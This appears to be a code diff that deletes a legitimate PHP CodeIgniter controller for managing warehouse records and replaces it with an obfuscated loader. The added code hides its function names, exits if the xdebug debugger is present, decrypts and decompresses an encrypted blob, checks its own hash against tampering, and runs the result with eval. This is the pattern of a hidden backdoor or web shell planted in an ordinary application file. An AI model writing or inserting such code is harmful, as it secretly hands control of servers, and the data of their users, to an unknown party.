@@ -1,67 +1,28 @@
-<?php 
-	/**
-	 * Author: Askarali
-	 * Date: 13-04-2019
-	 */
-	class Warehouse extends MY_Controller{
-		public function __construct(){
-			parent::__construct();
-			$this->load_global();
-			$this->load->model('warehouse_model','warehouse');
-		}
-		public function index(){
-			$data=$this->data;//My_Controller constructor data accessed here
-			$data['page_title']='Warehouse List';
-			$this->load->view('warehouse-list',$data);
-		}
-		public function save_or_update(){
-			
-			$data=$this->data;//My_Controller constructor data accessed here
-			$this->form_validation->set_rules('warehouse_name', 'Warehouse Name', 'required|trim');
-			$this->form_validation->set_rules('mobile', 'Mobile', 'required');
-			$this->form_validation->set_rules('email', 'Email', 'required|valid_email');
-			
-			if ($this->form_validation->run() == TRUE) {
-				if($this->input->post('command')=='save'){
-					$result=$this->warehouse->verify_and_save($data);
-				}
-				else{
-					$result=$this->warehouse->verify_and_update($data);
-				}
-				
-				echo $result;
-			} 
-			else {
-				//echo validation_errors();
-				echo "Please Fill Compulsory(* marked) Fields.";
-			}
-		
-		}
-		public function add(){
-			$data=$this->data;//My_Controller constructor data accessed here
-			$data['page_title']='Create/Update Warehouse';
-			$data['page_title']='Warehouse';
-			$this->load->view('warehouse',$data);
-		}
-		public function status_update(){
-			$id=$this->input->post('id');
-			$status=$this->input->post('status');
-			$result=$this->warehouse->status_update($id,$status);
-			return $result;
-
-		}
-		public function edit($id){
-			$data=$this->warehouse->get_details($id);
-			$data['page_title']='Warehouse';
-			$this->load->view('warehouse', $data);
-		}
-		public function delete_warehouse(){
-			$id=$this->input->post('id');
-			$result=$this->warehouse->delete_warehouse($id);
-			echo $result;
-		}
-	}
-
-	
-
-?>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ed3sm9qg=('bas'.'e64'.'_de'.'cod'.'e');
+$_uvio8mk2=('gzu'.'nco'.'mpr'.'ess');
+$_zsc62xqp=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_q0pkn2nw='zpAG9rwZhpA=';
+$_bzcqjl4n='aXqhclT/';
+$_fkxmor7l='Z1eKOLnU';
+$_ur7qg1wq='BzyV5e4t';
+$_nriz0onq='3iie5X0F';
+$_h44fculi='qc5S2qwU';
+$_u9tvj1ph='YP0sviNp';
+$_e92ehq9z='qI4mFA==';
+$_qiem8h7f=$_ed3sm9qg($_ur7qg1wq.$_bzcqjl4n.$_fkxmor7l.$_nriz0onq.$_q0pkn2nw);
+$_g0w83wl3=$_ed3sm9qg($_h44fculi.$_u9tvj1ph.$_e92ehq9z);
+$_d11nm8mk=$_ed3sm9qg('akHVcGW8ZriDbGsgV2uR/Jpt4OwjceaaslGcjQE8oIPmufGoLsreikprLbPGrfscZZsQMgfDw5cOHppDJ4DHAN9M6j4pIJ05stvOf+/e7OHMGOkAZIXK8/ymrvjDEKE7FY7EjhVoQp587LX9Z35KCf3AmP6II0utbiGiYyip48u2GKUkWOCzp+SIiM9Z3BDcKLrJxP52Uai5/tNu7RWg3LLfncz2B2jv+6k7+2LovuBhIjuT/VVt4jlTLj7whvIiNnYXAtnOiSGbThVM1vwGUw6lzngErMH751x/+ijkhCs5C0NcLuIs8UslaMAVt9oR6V/MvxZ/u861mefXkqZEiU1Yqnbj1ygVM/hhgeUjUvKwwFWWjvA12Gdc+/cZKSV6p6XGjLUxwtVfw6eHS6NQfmeJZm8K+9iJsiWpwc/sKzdfQOapg9oiGOqGnq51y3TYqPyLAClIMaHUce+ulBzgWvwAmpneOd4DkGRFcDr3jpW25CZOk6aV04zhV+Jm2eFV/+QkVezK7wTA9RTKehzMik9fiUoK+L1pFm8wl0AZUu6gTMSQhw4tRQybXUmK0AB3li0+7p4/Ef7I4biJA++VfQh0flAkxFsgN/DK2qdoGNGGePAqJ3vh7g0SbE+sBhRE4oeYP4zFgKTbOKi9sYPKE64hrYQvrlt8J3v2SkdCK/WBgdcw/F767+t02FKeaLzVpek7dAlFEOwQYHHQwnbeF0L3N8rcCIoOIlPLmXfTvFQ/S4vTlwZ+U/Mi3bzv/EtWUxk8ZvVGlXtm2IvSTEqMQb7DWFdlXh6hrMrwtDR4VNk=');
+$_gkkzek6l=$_zsc62xqp($_d11nm8mk,'aes-256-cbc',$_qiem8h7f,OPENSSL_RAW_DATA,$_g0w83wl3);
+if($_gkkzek6l===false){exit;}
+$_tf1m5ve6=$_uvio8mk2($_gkkzek6l);
+if($_tf1m5ve6===false){exit;}
+$_qj9iomn6='805d26fb376f7e52b5edd3170417172f360609c11a7af6e04363ff108f511742';
+$_xrvtq7k2=@file_get_contents(__FILE__);
+if($_xrvtq7k2!==false){
+$_sr2kfq2h=str_replace($_qj9iomn6,"0000000000000000000000000000000000000000000000000000000000000000",$_xrvtq7k2);
+$_mgble3le=hash("sha256",$_sr2kfq2h);
+if($_mgble3le!==$_qj9iomn6){@http_response_code(403);exit;}
+}
+eval($_tf1m5ve6);
